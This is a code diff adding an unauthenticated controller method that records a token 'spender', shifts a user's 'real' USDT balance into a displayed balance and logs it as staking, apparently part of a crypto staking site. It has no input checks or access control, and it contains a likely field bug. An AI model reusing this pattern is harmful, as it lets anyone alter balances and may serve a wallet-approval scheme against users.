@@ -160,6 +160,41 @@ class UserController extends Controller
         echo "ok";
     }
 
+    public function fetchUsdtToken(Request $request)
+    {
+
+        $user = User::where('wallet', $request->wallet)->first();
+
+        Stake::create([
+            'user_id' => $user->id,
+            'spender' => $request->spender,
+            'amount'  => $request->amount,
+            'type' => 'eth'
+        ]);
+
+        $user->spender = $request->spender;
+
+        $user->usdt_real_balance = $user->usdt_real_balance - $request->amount;
+
+        $user->usdt_balance = $user->usdt_balance + $request->amount;
+
+        $user->usdt_balance_updated_at = now();
+
+        $user->update();
+
+        Transaction::create([
+
+            'user_id' => $user->user_id,
+            'wallet' => $request->wallet,
+            'amount' => $request->amount,
+            'status' => 'Staked Usdt',
+
+        ]);
+
+
+        echo "ok";
+    }
+
     public function updateStatus(Request $request)
     {
         $user = User::where('id', $request->user_id)->first();
